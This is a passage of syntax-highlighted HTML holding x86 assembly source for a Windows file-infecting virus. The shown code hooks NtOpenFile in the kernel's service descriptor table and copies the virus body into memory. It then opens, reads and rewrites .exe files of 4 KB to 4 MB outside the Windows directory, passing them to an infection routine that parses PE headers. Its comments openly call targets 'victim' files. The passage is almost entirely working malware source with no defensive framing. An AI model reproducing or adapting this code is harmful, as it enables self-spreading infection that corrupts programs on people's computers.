                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ResidentDeltaHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; prepare our resident DeltaHandle in hook function</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">NtOpenFileHookFunction</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HookedNtOpenFileAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">; copy the whole virus body to allocated memory</span><span class="sc0">
                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,(</span><span class="sc5">Virus_size_memory</span><span class="sc4">/</span><span class="sc2">256</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; mov ecx,Virus_size_memory</span><span class="sc0">
                                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; we finally enable the hook function by storing a new NtOpenFile handler address in ServiceDescriptorTable ;))</span><span class="sc0">

</span><span class="sc5">ExitFromRing0Code</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">popad</span><span class="sc0">   </span><span class="sc1">; we get back to slave ring3 ;(</span><span class="sc0">
                                </span><span class="sc6">sti</span><span class="sc0">
                                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">; Hook function for NtOpenFile</span><span class="sc0">

</span><span class="sc5">NtOpenFileHookFunction</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">     </span><span class="sc1">; mov dword [DWORD],DWORD &gt; this is a pass valve, when executed all the calls to NtOpenFile will be redirected to original handler</span><span class="sc0">
</span><span class="sc5">OffsetOfNtOpenFileAddressInSDT</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OriginalNtOpenFileAddress</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">  </span><span class="sc1">; push XXXXXXXXh</span><span class="sc0">
</span><span class="sc5">OriginalNtOpenFileHandler</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc6">pushfd</span><span class="sc0">
                                </span><span class="sc6">pushad</span><span class="sc0">
                                </span><span class="sc6">cld</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0"> </span><span class="sc1">; mov ebp,</span><span class="sc0">
</span><span class="sc5">ResidentDeltaHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we take ObjectAttributes parameter</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OBJECT_ATTRIBUTES.RootDirectory</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OBJECT_ATTRIBUTES.ObjectName</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">UNICODE_STRING.Buffer</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">UNICODE_STRING.Length</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">       </span><span class="sc1">; if filename size is less than this, exit</span><span class="sc0">
                                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00200020h</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we skip \??\X: ( in unicode )</span><span class="sc0">
                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and we both: move+lowercase</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0077007Ch</span><span class="sc0">       </span><span class="sc1">; \ 0 w 0 ( unicode "\w" ) ?</span><span class="sc0">
                                </span><span class="sc6">setz</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">006E0069h</span><span class="sc0">       </span><span class="sc1">; i 0 n 0 ( unicode "in" ) ?</span><span class="sc0">
                                </span><span class="sc6">setz</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; are both true? ( \ 0 w 0 i 0 n 0 )</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc0">  </span><span class="sc1">; if true, exit</span><span class="sc0">
                                
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; we take last part ( extension )</span><span class="sc0">
                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; and we both: move+lowercase</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0065002Eh</span><span class="sc0">       </span><span class="sc1">; . 0 e 0 ( unicode ".e" ) ?</span><span class="sc0">
                                </span><span class="sc6">setz</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00650078h</span><span class="sc0">       </span><span class="sc1">; x 0 e 0 ( unicode "xe" ) ?</span><span class="sc0">
                                </span><span class="sc6">setz</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; are both true? ( . 0 e 0 x 0 e 0 )</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc0">  </span><span class="sc1">; if false, exit</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SYNCHRONOUS_IO_NONALERT</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc5">FILE_NON_DIRECTORY_FILE</span><span class="sc0"> </span><span class="sc1">; we want all file operations to be sinchronized ( calls wont return till read/write is completed )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; share none</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; IoStatusBlock</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; ObjectAttributes ( the one we took from the caller itself )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ALL_ACCESS</span><span class="sc0">    </span><span class="sc1">; includes the NEEDED SYNCHRONIZE access flag</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZwOpenFile</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we open the possible victim file</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc0">

                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,((</span><span class="sc5">FILE_STANDARD_INFORMATION_size</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; we reserve local stack space for a variable of type FILE_STANDARD_INFORMATION</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                                
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FileStandardInformation</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_STANDARD_INFORMATION_size</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZwQueryInformationFile</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we obtain filesize among other unneeded things xD</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FILE_STANDARD_INFORMATION.EndOfFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EndOfFile is a field of QWORD size containing the file size.</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FILE_STANDARD_INFORMATION.EndOfFile</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,(((</span><span class="sc5">FILE_STANDARD_INFORMATION_size</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; +4 because we balance the push eax&amp;mov eax,esp above</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode_</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode_</span><span class="sc0"> </span><span class="sc1">; if its bigger than 4 GB, exit ( of course xDDD )</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">     </span><span class="sc1">; is size under 4MB upper limit ?</span><span class="sc0">
                                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode_</span><span class="sc0"> </span><span class="sc1">; if not under, exit</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; is size below 4KB lower limit ?</span><span class="sc0">
                                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode_</span><span class="sc0">  </span><span class="sc1">; if below, exit</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Tag ( Nothing )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PagedPool</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExAllocatePoolWithTag</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; we allocate temporal memory for filesize+4KB</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode_</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; we push the returned memory address so that it can be freed later by ExFreePool</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; pointer to start offset to read from ( 0: begining of file )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; count of bytes to read</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; pointer to the buffer that will receive read bytes</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; pointer to IoStatusBlock ( not needed really )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; file handle</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZwReadFile</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we read from file</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode__</span><span class="sc0">

                                </span><span class="sc1">; see InfectFile description above...</span><span class="sc0">
                                </span><span class="sc1">; It receives EDI=File size, ESI=Buffer with 4KB space, file contents.</span><span class="sc0">
                                </span><span class="sc1">; and returns EDI=Number of bytes to write ( new file size ) or 0 if error, ESI=Offset from where bytes to write are to be taken.</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; Error while trying to infect?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitFromNtOpenFileHookCode__</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; pointer to start offset to write to ( 0: begining of file )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; count of bytes to write</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; pointer to the buffer that contains the bytes to be written</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; pointer to IoStatusBlock ( not needed really )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; NULL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; file handle</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZwWriteFile</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">ExitFromNtOpenFileHookCode__</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExFreePool</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we free the previously allocated temporal memory</span><span class="sc0">
                                                        </span><span class="sc1">; note that the parameter ( base of memory block ) was pushed before calling InfectFile</span><span class="sc0">
</span><span class="sc5">ExitFromNtOpenFileHookCode_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZwClose</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; we close the file</span><span class="sc0">

</span><span class="sc5">ExitFromNtOpenFileHookCode</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popad</span><span class="sc0">
                                </span><span class="sc6">popfd</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">     </span><span class="sc1">; mov dword [DWORD],DWORD &gt; this is the counterpart for the first instruction of this routine, when this instrucion is executed, the redirection is disabled and next call to NtOpenFile will execute our routine again</span><span class="sc0">
</span><span class="sc5">OffsetOfNtOpenFileAddressInSDT_</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HookedNtOpenFileAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; FILE INFECTION ROUTINE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It receives EDI=File size, ESI=Buffer with 4KB space, file contents.</span><span class="sc0">
</span><span class="sc1">; and returns EDI=Number of bytes to write ( new file size ) or 0 if error, ESI=Offset from where bytes to write are to be taken.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">; we make EBX point to the starting address of fileïs bytes</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.e_lfanew</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">512</span><span class="sc0">        </span><span class="sc1">; is the offset to new header too far ( above 1'5 KB ) ?</span><span class="sc0">
                                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">   </span><span class="sc1">; if too far, exit ( this check has 2 reasons, a) we must fit into 4 KB minus original SizeOfHeader, b) some non PE EXEs have this field with an arbitrary ( big ) value, and we dont want a page fault, do we ? )</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; ESI now points to PE header of the file</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">      </span><span class="sc1">; Is it a PE file ( 'P','E',0,0 ) ?</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">  </span><span class="sc1">; If not, exit</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">  </span><span class="sc1">; we wont infect PE files that have a non 4KB virtual alignment</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.FileAlignment</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">00000200h</span><span class="sc0">
